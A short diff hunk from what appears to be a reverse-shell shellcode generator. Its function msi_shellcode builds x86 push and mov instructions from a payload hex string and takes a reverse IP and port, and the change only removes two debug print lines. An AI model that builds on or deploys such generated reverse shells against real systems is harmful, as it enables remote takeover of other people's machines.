@@ -242,8 +242,6 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
             instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
         # handle the left ofer instructions
         elif ((0 == i-1) and ((i % 8) != 0)):
-            print(rev_hex_payload_len)
-            print(rev_hex_payload_len%8)
             if (rev_hex_payload_len%8 == 2):
                 first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
                 first_instructions.append("push eax;")
